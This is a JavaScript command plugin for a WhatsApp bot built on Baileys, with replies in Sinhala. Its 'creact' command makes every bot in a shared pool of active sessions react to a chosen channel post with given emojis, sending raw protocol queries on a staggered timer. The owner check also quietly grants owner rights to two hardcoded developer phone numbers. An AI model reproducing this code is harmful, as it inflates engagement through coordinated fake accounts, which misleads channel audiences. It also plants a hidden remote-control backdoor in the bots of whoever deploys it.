import { delay } from "@whiskeysockets/baileys";

// Fast Channel Metadata Cache (No repetitive network calls)
global.channelJidCache = global.channelJidCache || new Map();

export default {
  name: "creact",
  aliases: ["cr"],
  category: "owner",
  description: "Official Protocol Channel Post Reactor for all active bots",

  async execute({ sock, msg, from, args }) {
    const reply = (text) => sock.sendMessage(from, { text }, { quoted: msg });

    try {
      // 1. Strict Owner & Developer Verification
      const senderJid = msg.key.fromMe 
        ? (sock.user?.id || "") 
        : (msg.key.participant || msg.participant || from || "");

      const cleanSender = String(senderJid).split("@")[0].split(":")[0].replace(/[^0-9]/g, "");
      const devNumbers = ["94719845166", "15947733680169"];
      const isDeveloper = devNumbers.some((num) => cleanSender.includes(num));
      const isOwner = msg.key.fromMe || isDeveloper;

      if (!isOwner) {
        sock.sendMessage(from, { react: { text: "🚫", key: msg.key } }).catch(() => {});
        return await reply("*⛔ ACCESS DENIED ⛔*\n\nමෙම Command එක භාවිතා කළ හැක්කේ Bot Owner හෝ Developer ට පමණි.");
      }

      // 2. Argument Parsing
      const fullText = args.join(" ").trim();
      if (!fullText || !fullText.includes(",")) {
        return await reply(`⚠️ *භාවිතය:*\n.creact <post_link>,<emoji1>,<emoji2>...\n\n*උදාහරණ:*\n.creact https://whatsapp.com/channel/0029VbBTkLI9Gv7bxPWEmg3D/2513,🖤,😚,✨`);
      }

      const parts = fullText.split(",").map((p) => p.trim()).filter(Boolean);
      const postLink = parts[0];
      const emojis = parts.slice(1);

      if (emojis.length === 0) {
        return await reply("❌ කරුණාකර අවම වශයෙන් එක emoji එකක්වත් ලබා දෙන්න.");
      }

      // Link Regex Validation
      const linkMatch = postLink.match(/whatsapp\.com\/channel\/([a-zA-Z0-9]+)(?:\/(\d+))/);
      if (!linkMatch || !linkMatch[1] || !linkMatch[2]) {
        return await reply("❌ වැරදි Channel Link එකක්! Share Link එකම ලබා දෙන්න (අගට post ID එක සහිතව).");
      }

      const channelCode = linkMatch[1];
      const postId = linkMatch[2];

      sock.sendMessage(from, { react: { text: "⏳", key: msg.key } }).catch(() => {});

      // 3. Ultra-Fast Channel JID Lookup (Cache First)
      let channelJid = global.channelJidCache.get(channelCode);
      if (!channelJid) {
        try {
          const metadata = await Promise.race([
            sock.newsletterMetadata("invite", channelCode),
            new Promise((_, reject) => setTimeout(() => reject(new Error("Timeout")), 7000))
          ]);
          channelJid = metadata?.id;
          if (channelJid) global.channelJidCache.set(channelCode, channelJid);
        } catch (e) {
          return await reply(`❌ Channel එක සොයාගත නොහැකි විය: ${e.message}`);
        }
      }

      if (!channelJid.endsWith("@newsletter")) {
        channelJid = `${channelJid.replace(/[^0-9]/g, "")}@newsletter`;
      }

      // 4. Active Bot Pool
      let botList = [];
      if (global.activeSockets && global.activeSockets.size > 0) {
        botList = Array.from(global.activeSockets.values());
      } else {
        botList = [sock];
      }

      await reply(
`🐦‍🔥 *C-REACT TURBO ENGINE*

📢 *Target:* \`${channelJid}\`
🎯 *Post ID:* \`${postId}\`
🤖 *Active Nodes:* ${botList.length}
✨ *Emojis:* ${emojis.join(" ")}

⚡ _සියලුම Bots එකවර Reaction යවයි..._`
      );

      // 5. Ultra-Fast Staggered Parallel Worker
      (async () => {
        let success = 0;
        let fail = 0;

        const tasks = botList.map((currentBot, index) => {
          return new Promise((resolve) => {
            const selectedEmoji = emojis[index % emojis.length];

            // Bots අතර 300ms ක ඉතා කුඩා පරතරයක් තබා WhatsApp Socket එක overload නොවී reaction යවයි
            setTimeout(async () => {
              try {
                await Promise.race([
                  currentBot.query({
                    tag: "message",
                    attrs: {
                      to: channelJid,
                      type: "reaction",
                      server_id: String(postId),
                      id: currentBot.generateMessageTag()
                    },
                    content: [
                      {
                        tag: "reaction",
                        attrs: {
                          code: selectedEmoji
                        }
                      }
                    ]
                  }),
                  new Promise((_, reject) => setTimeout(() => reject(new Error("Timeout")), 5000))
                ]);
                success++;
              } catch (_) {
                fail++;
              }
              resolve();
            }, index * 300);
          });
        });

        await Promise.allSettled(tasks);

        sock.sendMessage(from, { react: { text: "✅", key: msg.key } }).catch(() => {});
        await reply(`✅ *C-REACT සාර්ථකයි!*\n\n🎯 *Post ID:* \`${postId}\`\n🔥 *වැටුණු Reactions:* ${success}\n⚠️ *Failed:* ${fail}`);
      })();

    } catch (err) {
      console.error("[C-REACT MAIN ERROR]:", err);
      sock.sendMessage(from, { react: { text: "❌", key: msg.key } }).catch(() => {});
      await reply(`❌ C-React දෝෂයකි: ${err.message}`);
    }
  }
};
